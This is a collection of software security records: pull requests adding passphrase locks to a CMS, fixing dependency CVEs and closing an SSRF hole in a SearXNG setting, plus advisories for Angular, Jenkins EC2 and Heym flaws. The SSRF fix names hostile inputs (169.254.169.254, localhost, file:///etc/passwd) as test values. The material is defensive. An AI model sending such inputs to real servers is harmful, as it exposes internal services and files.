# → 401 {"errors":[{"code":"password_required", …}]}

TOKEN=$(curl -s -X POST .../api/content/page/proposal/unlock \
  -d '{"passphrase": "shared secret"}' | jq -r .token)

curl -s .../api/content/page/proposal -H "x-kiln-unlock: $TOKEN"
```

On the built-in site the page answers 401 with a passphrase form; the editor
sets it in the Settings rail.

## Why two stored columns

A grant has to survive a round trip to the client, and a bcrypt hash in a
readable (if signed) cookie hands an attacker an offline cracking target on the
strength of one correct guess. So the lock stores the hash **and** a `sha256`
fingerprint of it, and the grant names the fingerprint.

That buys rotation for free, in the place it cannot be forgotten: the delivery
reads match the fingerprint **in their filter**, so changing the passphrase
changes the hash → changes the fingerprint → every outstanding grant stops
selecting the row. There is no revocation step to skip. bcrypt salts per row, so
two documents sharing a passphrase still have different fingerprints — a grant is
document-scoped without carrying a document id.

## The exclusion sweep

The issue is right that this is where reviews should focus. A lock that keeps a
visitor off the page while the same text sits in a feed is not weak protection,
it is none.

**One policy block does most of it.** It is a *separate* `policy action_type(:read)`
from the audience one — Ash ANDs policies and ORs the checks within one, so
folding it in would have made the lock an *alternative* grant and let an
`InAudience` reader straight past it. As its own block it excludes locked content
from the sitemap, feeds, `llms.txt`, the calendar, ActivityPub and
keyword/semantic search at once, because every one of those reads actorless with
`authorize?: true`. A surface added later inherits the exclusion instead of
having to remember it.

Four paths bypass policies and needed their own guard: **related content** (the
vector query is unauthorized by design), **Meilisearch** (no audience or grant
facet, anonymous queries — so locking previously-indexed content *deletes* it),
**embeddings** (document and per-block; a locked document indexes as if it had no
blocks, which prunes the rows it had), and **newsletters** (the one channel with
no unlock step in front of it).

## Caching

Unlocked responses are `private, no-store` with no ETag on both surfaces. With
`public, max-age=60` the first unlocked visitor populates a shared cache and the
next minute of anonymous visitors read the document without ever seeing the lock
page. The payload cache is bypassed by any request carrying a grant, for the same
reason gated requests already bypass it. **A locked document is not a
CDN-friendly one**, and the docs say so.

## Found in self-review, fixed in the second commit

- **A locked page with a `path_alias` was served in full, no passphrase.** An
  aliased document resolves through `Slugs.find_published_by_alias/4` — a
  hand-built query — *instead of* `:public_by_slug`, so it inherited none of that
  action's filter, and the alias lookup runs *first* in the delivery funnel. Not
  a corner: every locked document with an alias was open at its canonical URL.
  The regression test fails against the first commit.
- **`unlocks` reached the GraphQL schema.** `hide_inputs [:audiences]` exists on
  those four queries precisely so an anonymous client cannot widen the read.
- Corrected an overstated docs claim rather than the code: only the *headless*
  unlock endpoint answers identically for "wrong passphrase" and "not locked".

## Notes

- The lock page is handed a `KilnCMSWeb.Teaser` — a struct with **no `blocks`
  field** — so it cannot render body content even if the read were widened.
- The lock ANDs with audiences, so the locked read takes `:audiences` too: a
  members-only locked post shows the paywall to a non-member and the passphrase
  form to a member, rather than prompting for a passphrase that wouldn't help.
- Hashing runs in `before_action`, not at changeset-build time — changes run on
  every `AshPhoenix.Form.validate`, which the editor fires per keystroke, and
  bcrypt is a deliberately slow KDF.
- Blank means **unchanged**, not "clear". The editor re-submits every field on
  every save and never echoes a password back, so reading blank as "clear" would
  drop the lock off a published document the first time anyone edited its title.
- Own tight rate-limit bucket (`:unlock`, 10/min), separate from `:auth` because
  there is no account to lock out instead.
- The hash is excluded from PaperTrail, so it never outlives a rotation in
  version history.

## Documentation

Deliberately documented as **weak**: [api.md](docs/api.md) (the headless
contract), [data-flows.md](docs/data-flows.md) (the one cookie a visitor can end
up with, and why it keeps the no-tracking promise — it carries no identifier and
two visitors who unlock the same page hold identical cookies), and a new residual
risk in [threat-model.md](docs/threat-model.md).

## Verification

Full gate green on the merged tree: `compile --warnings-as-errors`, `format`,
`credo --strict`, `sobelow`, `mix docs`, `MIX_ENV=test mix dialyzer`,
`kiln.gettext.check` + the drift gate, doc-anchor test, and **both** codegen
drift checks (strict core and acupuncture overlay — this touches the shared
`Content` macro, so the overlay carries its own half of the migration).

`mix test`: **5390 passed**, 28 of them the lock suite. The 7 failures are
`KilnCMS.Backups.WorkerTest` — the known local pg_dump/server version skew, which
fails identically on `main`.

## What

Fixes both the **"Supply chain (pip-audit + safety)"** and **"security"** CI jobs, red on `main` for 7 known CVEs across 3 packages (pre-existing — `uv.lock` is unchanged by any recent PR; confirmed by diffing against `main`).

### Fixed by version bump
- `click` 8.1.8 → 8.4.2 (clears `PYSEC-2026-2132`, fix ≥ 8.3.3)
- `pillow` 12.2.0 → 12.3.0 (clears `PYSEC-2026-2253/2254/2255/2256/2257`)

### Triaged — no fix available
- `ecdsa` 0.19.2, `PYSEC-2026-1325` (no fix as of 2026-07-15). Transitive via `bip-utils`, used **only** for `Bip32Slip10Secp256k1` HD derivation (BTC/ETH address display) in `maistro.identity`. I read `identity/__init__.py` and `identity/lifecycle.py`: every real `sign()`/`verify()` goes through `nacl.signing` (Ed25519), and `_require_ed25519_path` explicitly **rejects** secp256k1 signing paths. The vulnerable code path (a Minerva-class timing side-channel in `ecdsa.SigningKey.sign_digest()`) is unreachable. Added to `security.yml`'s allowlist (matching the existing 4-entry rigor) and to `ci.yml`'s bare `pip-audit --strict` via `--ignore-vuln` (that job has no allowlist post-processing).

### Fallout from the click bump
Click 8.2+ raises `NoArgsIsHelpError` for `no_args_is_help` commands, exiting **2** instead of **0** — help text itself is unaffected. This reproduces even at the minimum fix version (8.3.3) and upgrading `typer` to 0.26.8 doesn't change it, so it's an intentional upstream Click convention change, not a typer/click incompatibility. Updated `test_no_args_shows_help`'s exit-code assertion; the other 19 CLI tests and the full Pillow-heavy `maistro-canvas` suite are unaffected.

## Verification
- Both CI commands **simulated locally** and pass clean (`No known vulnerabilities found, 1 ignored` / allowlist path).
- Full `maistro-core` suite: **5560 passed**.
- A pre-existing, unrelated flake in `maistro-rsi/test_persistence_integrity.py` (order-dependent; reproduces identically on unmodified `main`) is out of scope here.

## Why separate
Split out from #251 (design/canvas review fixes) — this is dependency/CI-infra hygiene with its own review surface (version bumps + a security allowlist decision).

snapshot_payload.description:
### Impact
angular-server-side-configuration detects used environment variables in TypeScript (.ts) files during build time of an Angular CLI project. The detected environment variables are written to a ngssc.json file in the output directory.
During deployment of an Angular based app, the environment variables based on the variables from ngssc.json are inserted into the apps index.html (or defined index file).

With version 15 the environment variable detection was widened to the entire project, relative to the angular.json file from the Angular CLI. In a monorepo setup, this could lead to environment variables intended for a backend/service to be detected and written to the ngssc.json, which would then be populated and exposed via index.html.

This has NO IMPACT, in a plain Angular project that has no backend component.

### Patches
Vulnerability has been mitigated in 15.1.0, by adding an option `searchPattern` which restricts the detection file range by default.

```bash
# Update via npm
npm update angular-server-side-configuration
## Or more specific
npm install angular-server-side-configuration@15.1.0

# Update via pnpm
pnpm update angular-server-side-configuration
## Or more specific
pnpm add angular-server-side-configuration@15.1.0

# Update via yarn
yarn update angular-server-side-configuration
## Or more specific
yarn add angular-server-side-configuration@15.1.0
```

### Workarounds
Manually edit or create ngssc.json or run a script after ngssc.json generation

snapshot_payload.body:
## Problem

Any user could set their SearXNG web-search base URL to an internal address such as `http://169.254.169.254` or `http://localhost`. Because the server then fetches that URL, a non-admin user could probe or read internal services and cloud metadata — a classic SSRF (server-side request forgery) hole. Non-http schemes like `file:///etc/passwd` were also accepted.

## Solution

In plain terms: regular users may only point web search at real public websites; only admins can point it at internal machines.

Details:

- `lib/web-search-catalog.ts`
  - New `searxngBaseUrlSchema` requires an http(s) URL with no embedded credentials and no fragment.
  - New `isNonPublicIpAddress()` detects private/reserved ranges: IPv4 loopback, `0.0.0.0/8`, `10/8`, `172.16/12`, `192.168/16`, `169.254/16` (cloud metadata), IPv6 `::`, `::1`, link-local `fe80::/10`, unique-local `fc00::/7`, and IPv4-mapped IPv6 forms.
  - New `isPublicHttpUrl()` checks the scheme and literal host, then resolves the hostname via DNS and requires every resolved address to be public; unresolvable hosts are rejected.
  - New `getWebSearchEndpointUrl()` helper extracts the SearXNG base URL from an update payload.
- `app/api/settings/general/route.ts`: non-admin users who submit a SearXNG base URL that is not a public http(s) endpoint get a `403` ("Only admins can point web search at private network addresses."); admins are unaffected.
- `lib/searxng.ts`: `searchSearxng` now refuses base URLs whose protocol is not `http`/`https` before issuing any request.

## Testing

- `tests/unit/web-search.test.ts`: covers literal private/loopback/metadata/IPv6 addresses classified non-public without DNS, public literal and resolved hosts, hostnames resolving (fully or partially) into private ranges, unresolvable hosts, non-http URLs, and schema rejection of non-http schemes, credentials, and fragments.
- `tests/unit/settings-route.test.ts`: verifies non-admins are blocked for `169.254.169.254`, unresolvable hosts, and `localhost`; verifies public URLs save for non-admins and private URLs still save for admins.
- `tests/unit/searxng.test.ts`: verifies `file://` and `ftp://` base URLs throw before `fetch` is called.

## Notes

- DNS-rebinding between validation and the actual fetch is not addressed; mitigations such as pinning resolved IPs or egress allowlists could be a follow-up.

snapshot_payload.description:
Amazon EC2 Plugin connects to Windows agents via HTTPS.

Amazon EC2 Plugin 1.50.1 and earlier unconditionally accepts self-signed HTTPS certificates and does not perform hostname validation when connecting to Windows agents. This lack of validation could be abused using a man-in-the-middle attack to intercept these connections to build agents.

Amazon EC2 Plugin 1.50.2 by default no longer accepts self-signed HTTPS certificates and performs hostname validation. A new configuration option allows restoring the previous, unsafe behavior. For more information see [the plugin documentation](https://github.com/jenkinsci/ec2-plugin/#securing-the-connection-to-windows-amis).
snapshot_payload.summary: Lack of SSL/TLS certificate and hostname validation in Amazon EC2 Plugin

snapshot_payload.description: Heym before 0.0.21 contains an authorization bypass vulnerability in workflow execution that allows authenticated users to execute arbitrary workflows by referencing victim workflow UUIDs without proper access validation. Attackers can create workflows with execute nodes or agent subWorkflowIds pointing to victim workflow UUIDs to load and execute those workflows under attacker-controlled execution paths, exposing victim workflow outputs and triggering workflow nodes with unintended side effects.
